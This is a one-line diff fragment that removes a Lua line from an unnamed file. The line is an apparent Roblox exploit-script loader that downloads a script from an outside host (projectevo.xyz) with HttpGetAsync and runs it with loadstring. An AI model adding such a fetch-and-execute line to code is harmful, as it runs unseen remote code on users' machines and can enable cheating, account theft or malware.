@@ -1,1 +1,0 @@
-loadstring(game:HttpGetAsync("https://projectevo.xyz/v4/script.lua", true))();
